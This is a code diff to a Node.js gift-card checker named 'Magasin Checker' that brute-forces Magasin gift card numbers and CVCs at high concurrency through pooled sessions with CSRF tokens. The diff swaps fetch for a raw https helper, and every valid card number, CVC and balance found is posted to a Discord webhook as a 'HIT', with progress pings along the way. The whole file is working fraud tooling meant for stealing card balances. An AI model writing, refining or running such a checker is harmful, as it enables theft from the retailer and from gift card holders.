@@ -19,7 +19,7 @@ const END_SUFFIX       = 9999;
 const CARD_CONCURRENCY = 25;
 const CVC_CONCURRENCY  = 12;
 const CSRF_TTL_MS      = 25 * 60 * 1000;
-const PROGRESS_MS      = 10 * 60 * 1000; // Discord progress ping every 10 min
+const PROGRESS_MS      = 10 * 60 * 1000;
 
 // ── SESSION POOL ───────────────────────────────────────────────────────
 const sessions = Array.from({ length: CARD_CONCURRENCY }, () => ({
@@ -50,6 +50,32 @@ function httpRequest(options, body = null) {
     req.on('error',   () => resolve({ status: 0, headers: {}, body: '' }));
     req.on('timeout', () => { req.destroy(); resolve({ status: 0, headers: {}, body: '' }); });
     if (body) req.write(body);
+    req.end();
+  });
+}
+
+// ── DISCORD — raw https, no fetch ─────────────────────────────────────
+function discordPost(payload) {
+  return new Promise((resolve) => {
+    const body = JSON.stringify(payload);
+    const url  = new URL(WEBHOOK);
+    const req  = https.request({
+      hostname: url.hostname,
+      path:     url.pathname + url.search,
+      method:   'POST',
+      headers: {
+        'Content-Type':   'application/json',
+        'Content-Length': Buffer.byteLength(body),
+        'User-Agent':     'MagasinChecker/1.0',
+      },
+      timeout: 8000,
+    }, (res) => {
+      res.resume();
+      resolve(res.statusCode);
+    });
+    req.on('error',   () => resolve(0));
+    req.on('timeout', () => { req.destroy(); resolve(0); });
+    req.write(body);
     req.end();
   });
 }
@@ -148,67 +174,53 @@ async function checkCard(cardNumber, cvc, slot) {
 
 // ── DISCORD — hit alert ────────────────────────────────────────────────
 async function sendHit(cardNumber, cvc, balance) {
-  try {
-    await fetch(WEBHOOK, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: balance > 0
-            ? '💳 HIT — Magasin Gavekort med saldo!'
-            : '✅ Valid card — 0 balance',
-          color: balance > 0 ? 0x00ff88 : 0xcc00ff,
-          fields: [
-            { name: 'Kortnummer', value: cardNumber,          inline: true },
-            { name: 'CVC',        value: cvc,                 inline: true },
-            { name: 'Saldo',      value: `**${balance} kr**`, inline: true },
-          ],
-          footer:    { text: 'Magasin Checker • Railway' },
-          timestamp: new Date().toISOString(),
-        }]
-      })
-    });
-  } catch {}
+  await discordPost({
+    embeds: [{
+      title: balance > 0
+        ? '💳 HIT — Magasin Gavekort med saldo!'
+        : '✅ Valid card — 0 balance',
+      color: balance > 0 ? 0x00ff88 : 0xcc00ff,
+      fields: [
+        { name: 'Kortnummer', value: cardNumber,          inline: true },
+        { name: 'CVC',        value: cvc,                 inline: true },
+        { name: 'Saldo',      value: `**${balance} kr**`, inline: true },
+      ],
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
 }
 
 // ── DISCORD — progress ping ────────────────────────────────────────────
 async function sendProgress(stats, cardCursor, totalCards, totalChks) {
-  try {
-    const elapsed = (Date.now() - stats.start) / 1000;
-    const rate    = (stats.checked / Math.max(1, elapsed)).toFixed(0);
-    const pct     = (cardCursor / totalCards * 100).toFixed(1);
-    const eta     = rate > 0
-      ? Math.round((totalChks - stats.checked) / rate)
-      : 0;
-    const etaStr  = eta > 3600
-      ? `${Math.floor(eta/3600)}h ${Math.floor((eta%3600)/60)}m`
-      : `${Math.floor(eta/60)}m ${eta%60}s`;
-    const elStr   = elapsed > 3600
-      ? `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`
-      : `${Math.floor(elapsed/60)}m`;
+  const elapsed = (Date.now() - stats.start) / 1000;
+  const rate    = (stats.checked / Math.max(1, elapsed)).toFixed(0);
+  const pct     = (cardCursor / totalCards * 100).toFixed(1);
+  const eta     = rate > 0 ? Math.round((totalChks - stats.checked) / rate) : 0;
+  const etaStr  = eta > 3600
+    ? `${Math.floor(eta/3600)}h ${Math.floor((eta%3600)/60)}m`
+    : `${Math.floor(eta/60)}m ${eta%60}s`;
+  const elStr   = elapsed > 3600
+    ? `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`
+    : `${Math.floor(elapsed/60)}m`;
 
-    await fetch(WEBHOOK, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: '📊 Progress Update',
-          color: 0x5865f2,
-          fields: [
-            { name: '✅ Checked',  value: stats.checked.toLocaleString(), inline: true },
-            { name: '💚 Valid',    value: String(stats.valid),            inline: true },
-            { name: '💳 Hits',     value: String(stats.hits),            inline: true },
-            { name: '⚡ Speed',    value: `${rate}/s`,                   inline: true },
-            { name: '📈 Progress', value: `${pct}%`,                     inline: true },
-            { name: '⏱ ETA',      value: etaStr,                        inline: true },
-            { name: '🕐 Running',  value: elStr,                         inline: false },
-          ],
-          footer:    { text: 'Magasin Checker • Railway' },
-          timestamp: new Date().toISOString(),
-        }]
-      })
-    });
-  } catch {}
+  await discordPost({
+    embeds: [{
+      title: '📊 Progress Update',
+      color: 0x5865f2,
+      fields: [
+        { name: '✅ Checked',  value: stats.checked.toLocaleString(), inline: true },
+        { name: '💚 Valid',    value: String(stats.valid),            inline: true },
+        { name: '💳 Hits',     value: String(stats.hits),             inline: true },
+        { name: '⚡ Speed',    value: `${rate}/s`,                    inline: true },
+        { name: '📈 Progress', value: `${pct}%`,                      inline: true },
+        { name: '⏱ ETA',      value: etaStr,                         inline: true },
+        { name: '🕐 Running',  value: elStr,                          inline: false },
+      ],
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
 }
 
 // ── CVC LIST — mid-range first ─────────────────────────────────────────
@@ -283,35 +295,28 @@ async function main() {
   await Promise.all(sessions.map((_, i) => refreshSession(i, true)));
   console.log(`[INFO] All sessions live. Sweeping.`);
 
-  // boot notification
-  await fetch(WEBHOOK, {
-    method:  'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      embeds: [{
-        title: '🚀 Checker Started',
-        color: 0x5865f2,
-        fields: [
-          { name: 'Cards',       value: totalCards.toLocaleString(),  inline: true },
-          { name: 'Total checks',value: totalChks.toLocaleString(),   inline: true },
-          { name: 'Concurrency', value: `${CARD_CONCURRENCY * CVC_CONCURRENCY}`, inline: true },
-        ],
-        footer:    { text: 'Magasin Checker • Railway' },
-        timestamp: new Date().toISOString(),
-      }]
-    })
-  }).catch(() => {});
+  await discordPost({
+    embeds: [{
+      title: '🚀 Checker Started',
+      color: 0x5865f2,
+      fields: [
+        { name: 'Cards',        value: totalCards.toLocaleString(),              inline: true },
+        { name: 'Total checks', value: totalChks.toLocaleString(),               inline: true },
+        { name: 'Concurrency',  value: `${CARD_CONCURRENCY * CVC_CONCURRENCY}`,  inline: true },
+      ],
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
 
   const stats    = { checked: 0, valid: 0, hits: 0, start: Date.now() };
   let cardCursor = 0;
 
-  // progress ping every 10 minutes
   const progressInterval = setInterval(() => {
     sendProgress(stats, cardCursor, totalCards, totalChks);
     console.log(`[PROGRESS] ${stats.checked.toLocaleString()} checked | ${stats.valid} valid | ${stats.hits} hits`);
   }, PROGRESS_MS);
 
-  // local log every 30 seconds
   const logInterval = setInterval(() => {
     const rate = (stats.checked / Math.max(1, (Date.now() - stats.start) / 1000)).toFixed(0);
     const pct  = (cardCursor / totalCards * 100).toFixed(1);
@@ -322,10 +327,8 @@ async function main() {
     while (true) {
       const idx = cardCursor++;
       if (idx >= cardList.length) return;
-
       const cardNumber = cardList[idx];
       const hits       = await sweepCard(cardNumber, slot, stats);
-
       for (const h of hits) {
         stats.valid++;
         if (h.balance > 0) stats.hits++;
@@ -343,25 +346,20 @@ async function main() {
   const elapsed = ((Date.now() - stats.start) / 1000).toFixed(0);
   console.log(`[DONE] ${stats.checked.toLocaleString()} checked | ${stats.valid} valid | ${stats.hits} hits | ${elapsed}s`);
 
-  // done notification
-  await fetch(WEBHOOK, {
-    method:  'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      embeds: [{
-        title: '✅ Sweep Complete',
-        color: 0x00ff88,
-        fields: [
-          { name: 'Checked', value: stats.checked.toLocaleString(), inline: true },
-          { name: 'Valid',   value: String(stats.valid),            inline: true },
-          { name: 'Hits',    value: String(stats.hits),             inline: true },
-          { name: 'Time',    value: `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`, inline: true },
-        ],
-        footer:    { text: 'Magasin Checker • Railway' },
-        timestamp: new Date().toISOString(),
-      }]
-    })
-  }).catch(() => {});
+  await discordPost({
+    embeds: [{
+      title: '✅ Sweep Complete',
+      color: 0x00ff88,
+      fields: [
+        { name: 'Checked', value: stats.checked.toLocaleString(),                                    inline: true },
+        { name: 'Valid',   value: String(stats.valid),                                               inline: true },
+        { name: 'Hits',    value: String(stats.hits),                                                inline: true },
+        { name: 'Time',    value: `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`,  inline: true },
+      ],
+      footer:    { text: 'Magasin Checker • Railway' },
+      timestamp: new Date().toISOString(),
+    }]
+  });
 }
 
 main().catch(e => {
